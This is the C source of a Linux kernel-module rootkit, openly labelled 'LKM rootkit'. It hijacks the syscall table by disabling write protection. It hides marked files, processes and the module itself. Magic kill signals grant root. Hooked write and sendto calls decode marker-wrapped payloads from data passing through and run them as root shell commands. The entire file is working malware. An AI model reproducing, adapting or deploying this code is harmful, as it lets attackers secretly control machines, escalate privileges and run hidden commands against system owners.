#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/string.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
#include <linux/umh.h>
#else
#include <linux/kmod.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
#include <linux/unistd.h>
#endif

#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#include "xt_rip.h"

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
unsigned long cr0;
#elif IS_ENABLED(CONFIG_ARM64)
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
#define section_size init_begin - start_rodata
#endif
static unsigned long *__sys_call_table;
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
	static t_syscall orig_write;
	static t_syscall orig_sendto;
	static t_syscall orig_getdents;
	static t_syscall orig_getdents64;
	static t_syscall orig_kill;
#else
	typedef asmlinkage int (*orig_write_t)(unsigned int, const void *, unsigned int);
	typedef asmlinkage int (*orig_sendto_t)(int, void *, size_t, unsigned int, struct sockaddr *, int);
	typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
	typedef asmlinkage int (*orig_getdents64_t)(unsigned int, struct linux_dirent64 *, unsigned int);
	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
	orig_write_t orig_write;
	orig_sendto_t orig_sendto;
	orig_getdents_t orig_getdents;
	orig_getdents64_t orig_getdents64;
	orig_kill_t orig_kill;
#endif

unsigned long * get_syscall_table_bf(
	void
) {
	unsigned long *syscall_table;
	
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
#ifdef KPROBE_LOOKUP
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
#endif
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
#else
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
#endif
}

struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int
is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_getdents64(
	const struct pt_regs *pt_regs
) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
	int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
	int ret = orig_getdents64(pt_regs), err;
#else
asmlinkage int hacked_getdents64(
	unsigned int fd,
	struct linux_dirent64 __user *dirent,
	unsigned int count
) {
	int ret = orig_getdents64(fd, dirent, count), err;
#endif
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	
	if (	d_inode->i_ino == PROC_ROOT_INO	// Reading /proc
		&&  !MAJOR(d_inode->i_rdev)			// No raw device set (confirms /proc)
		/*&& MINOR(d_inode->i_rdev) == 1*/
	) proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;

		if (	(!proc && (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
			||  (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))
		) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
		int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
	int ret = orig_getdents(pt_regs), err;
#else
asmlinkage int hacked_getdents(
	unsigned int fd,
	struct linux_dirent __user *dirent,
	unsigned int count
) {
	int ret = orig_getdents(fd, dirent, count), err;
#endif
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc && 
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

void give_root(
	void
) {
	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
		current->uid = current->gid = 0;
		current->euid = current->egid = 0;
		current->suid = current->sgid = 0;
		current->fsuid = current->fsgid = 0;
	#else
		struct cred *newcreds;
		newcreds = prepare_creds();

		if (newcreds == NULL)
			return;
		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			newcreds->uid.val = newcreds->gid.val = 0;
			newcreds->euid.val = newcreds->egid.val = 0;
			newcreds->suid.val = newcreds->sgid.val = 0;
			newcreds->fsuid.val = newcreds->fsgid.val = 0;
		#else
			newcreds->uid = newcreds->gid = 0;
			newcreds->euid = newcreds->egid = 0;
			newcreds->suid = newcreds->sgid = 0;
			newcreds->fsuid = newcreds->fsgid = 0;
		#endif
		
		commit_creds(newcreds);
	#endif
}

static inline void tidy(
	void
) {
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;
void module_show(
	void
) {
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

void module_hide(
	void
) {
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int hacked_kill(
	const struct pt_regs *pt_regs
) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
	pid_t pid = (pid_t) pt_regs->regs[0];
	int sig = (int) pt_regs->regs[1];
#endif
#else
asmlinkage int hacked_kill(
	pid_t pid,
	int sig
) {
#endif
	struct task_struct *task;
	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
			return orig_kill(pt_regs);
#else
			return orig_kill(pid, sig);
#endif
	}
	return 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void
write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}
#endif

static inline void
protect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0);
#else
	write_cr0(cr0);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
			section_size, PAGE_KERNEL_RO);

#endif
}

static inline void
unprotect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0 & ~0x00010000);
#else
	write_cr0(cr0 & ~0x00010000);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
			section_size, PAGE_KERNEL);
#endif
}

static int init(void);
static void cleanup(void);

typedef struct _marker_pos {
	const char *begin;
	const char *end;
	size_t size;
} marker_pos;

typedef unsigned char ubyte;
 
int findIndex(const ubyte val) {
    if ('A' <= val && val <= 'Z') return val - 'A' + 26;
    if ('a' <= val && val <= 'z') return val - 'a';
    if ('0' <= val && val <= '9') return val - '0' + 52;
    if (val == '_') return 62;
    if (val == '-') return 63;
    return -1;
}
 
int decode(const ubyte source[], ubyte sink[]) {
    const size_t length = strlen(source);
    const ubyte *it = source;
    const ubyte *end = source + length;
    int acc;
 
    while (it != end) {
        const ubyte b1 = *it++;
        const ubyte b2 = *it++;
        const ubyte b3 = *it++;
        const ubyte b4 = *it++;

        const int i1 = findIndex(b1);
        const int i2 = findIndex(b2);

        if (i1 == -1 || i2 == -1) break;
 
        acc = i1 << 2;
        acc |= i2 >> 4;
        *sink++ = acc; 
        const int i3 = findIndex(b3);
        if (i3 == -1) continue;

        acc = (i2 & 0xF) << 4;
        acc += i3 >> 2;
        *sink++ = acc;

        const int i4 = findIndex(b4);
        if (i4 == -1) continue;

        acc = (i3 & 0x3) << 6;
        acc |= i4;
        *sink++ = acc;
    }
 
    *sink = '\0';
    return 0;
}

static marker_pos get_marker_pos(const char *buffer) {
	marker_pos pos = { NULL, NULL, 0 };
	int i;

	for (i = 0; i < BUFFER_SIZE; ++i) {
		if (buffer[i] == MARKER[0] && strncmp(MARKER, buffer + i, MARKER_SIZE) == 0) {
			if (!pos.begin) pos.begin = buffer + i;
			else {
				pos.end = buffer + i + MARKER_SIZE;
				pos.size = (size_t)(pos.end - pos.begin);
				break;
			}
		}
	}

	return pos;
}

void sh(char *payload) {
	size_t payload_size = strlen(payload) + 13;
	char *full_payload = kzalloc(payload_size + 1, GFP_KERNEL);
	snprintf(full_payload, payload_size, "kill -%i $$&&%s", SIGINVIS, payload);

	char* envp[] = {"HOME=/", NULL};
	char* argv[] = {"/bin/sh", "-c", full_payload, NULL};
	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

void handle_xtrip(const void *user_buffer, size_t len) {
	marker_pos pos;
	char *raw_payload, *payload;
	char buffer[BUFFER_SIZE];
	size_t payload_size, remaining_size;
	int copied_size;

	if (!user_buffer || len + 1 > BUFFER_SIZE) return;

	copied_size = copy_from_user(buffer, (char*) user_buffer, len < BUFFER_SIZE ? len : BUFFER_SIZE);
	pos = get_marker_pos(buffer);

	if (pos.size == 0) return;

	payload_size = pos.size - MARKER_SIZE*2;
	raw_payload = kzalloc(payload_size + 1, GFP_KERNEL);
	strncpy(raw_payload, pos.begin + MARKER_SIZE, payload_size);
	payload = kzalloc(payload_size + 1, GFP_KERNEL);
	decode(raw_payload, payload);

    remaining_size = (size_t)(buffer + len - pos.end);

    memcpy((void *) pos.begin, pos.end, remaining_size);
    memset((void *) pos.begin + remaining_size, '\0', pos.size + 1);

	copied_size = copy_to_user((void *)user_buffer, buffer, BUFFER_SIZE);

	sh(payload);
	kfree(payload);
	kfree(raw_payload);
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_sendto(const struct pt_regs *pt_regs) {
	int ret;
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	const void * buf = (const void *) pt_regs->si;
	int len = (int) pt_regs->dx;
#elif IS_ENABLED(CONFIG_ARM64)
	const void * buf = (const void *) pt_regs->regs[1];
	int len = (int) pt_regs[2];
#endif
#else
asmlinkage int hacked_sendto(
	int sockfd,
	void *buf,
	size_t len,
	unsigned int flags,
	struct sockaddr *dest_addr,
	int addrlen
) {
	int ret;
#endif
	handle_xtrip(buf, len);

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	ret = orig_sendto(pt_regs);
#else
	ret = orig_sendto(sockfd, buf, len, flags, dest_addr, addrlen);
#endif

	return ret;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_write(const struct pt_regs *pt_regs) {
	int ret;
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	const void * buf = (const void *) pt_regs->si;
	size_t len = (size_t) pt_regs->dx;

#elif IS_ENABLED(CONFIG_ARM64)
	const void * buf = (const void *) pt_regs->regs[1];
	size_t len = (size_t) pt_regs[2];
#endif
#else
asmlinkage int hacked_write(
	int fd,
	const void *buf,
	size_t len
) {
	int ret;
#endif
	handle_xtrip(buf, len);

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	ret = orig_write(pt_regs);
#else
	ret = orig_write(fd, buf, len);
#endif

	return ret;
}

static int init(
	void
) {
	__sys_call_table = get_syscall_table_bf();
	if (!__sys_call_table)
		return -1;

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	cr0 = read_cr0();
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
#endif

	module_hide();
	tidy();

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	orig_write = (t_syscall)__sys_call_table[__NR_write];
	orig_sendto = (t_syscall)__sys_call_table[__NR_sendto];
	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
#else
	orig_write = (orig_write_t)__sys_call_table[__NR_write];
	orig_sendto = (orig_sendto_t)__sys_call_table[__NR_sendto];
	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
#endif

	unprotect_memory();

	__sys_call_table[__NR_write] = (unsigned long) hacked_write;
	__sys_call_table[__NR_sendto] = (unsigned long) hacked_sendto;
	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

	protect_memory();

	return 0;
}

static int __init _init(void) {
	return init();
}

static void cleanup(void) {
	unprotect_memory();

	__sys_call_table[__NR_write] = (unsigned long) orig_write;
	__sys_call_table[__NR_sendto] = (unsigned long) orig_sendto;
	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;

	protect_memory();
}

static void __exit _cleanup(void) {
	cleanup();
}

module_init(_init);
module_exit(_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ZanyMonk");
MODULE_DESCRIPTION("LKM rootkit");
